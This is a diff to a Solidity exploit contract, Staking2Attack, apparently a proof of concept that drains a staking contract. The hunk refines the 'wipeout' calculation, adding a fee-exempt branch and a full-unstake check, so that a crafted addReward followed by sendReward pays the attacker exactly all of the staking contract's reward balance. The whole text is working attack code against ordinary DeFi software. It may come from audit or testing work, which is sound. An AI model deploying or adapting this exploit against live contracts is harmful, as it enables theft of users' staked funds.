@@ -52,17 +52,22 @@ contract Staking2Attack is IERC777Recipient, Context {
 
             uint248 wipeout;
             {
-                (, uint248 lastReward, ) = STAKING.stakerInfo(token, address(this));
+                (bool feeExempt, uint248 lastReward, uint256 stake) = STAKING.stakerInfo(token, address(this));
+                require(amount == stake, "Staking2Attack: partial unstake");
                 uint256 tokenBalance = token.balanceOf(address(STAKING));
                 uint256 rewardBalance = REWARDS.balanceOf(address(STAKING));
                 // This is the amount to be added such that when we call
                 // `sendReward`, we get *exactly* all of `STAKING`'s balance
-                wipeout = uint248(
-                    (FEE_DENOM * tokenBalance * rewardBalance + (FEE_DENOM - 1) * lastReward * amount) /
-                        ((FEE_DENOM - 1) * amount - FEE_DENOM * tokenBalance)
-                );
+                if (feeExempt) {
+                    wipeout = uint248((tokenBalance * rewardBalance + lastReward * stake) / (stake - tokenBalance));
+                } else {
+                    wipeout = uint248(
+                        (FEE_DENOM * tokenBalance * rewardBalance + (FEE_DENOM - 1) * lastReward * stake) /
+                            ((FEE_DENOM - 1) * stake - FEE_DENOM * tokenBalance)
+                    );
+                }
             }
-            REWARDS.approve(address(STAKING), uint256(wipeout));
+            REWARDS.approve(address(STAKING), wipeout);
             STAKING.addReward(token, wipeout);
 
             STAKING.sendReward(token, address(this));
